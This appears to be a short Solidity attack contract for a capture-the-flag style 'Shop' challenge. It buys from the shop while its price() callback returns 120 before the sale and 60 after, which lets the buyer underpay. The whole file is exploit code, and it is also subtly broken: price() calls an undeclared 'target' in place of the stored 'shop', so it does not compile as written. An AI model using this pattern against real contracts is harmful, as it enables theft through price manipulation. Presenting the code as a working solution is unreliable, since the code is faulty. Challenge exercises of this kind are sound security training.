// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Shop.sol";
import "hardhat/console.sol";

contract ShopAttack {
    Shop private immutable shop;

    constructor(address _shop) {
        shop = Shop(_shop);
    }

    function attack() external {
        shop.buy();
    }

    function price() external returns (uint256) {
       bool sold = target.isSold();
        if (!sold) {
            return 120;
        }
        return 60;
    }
}
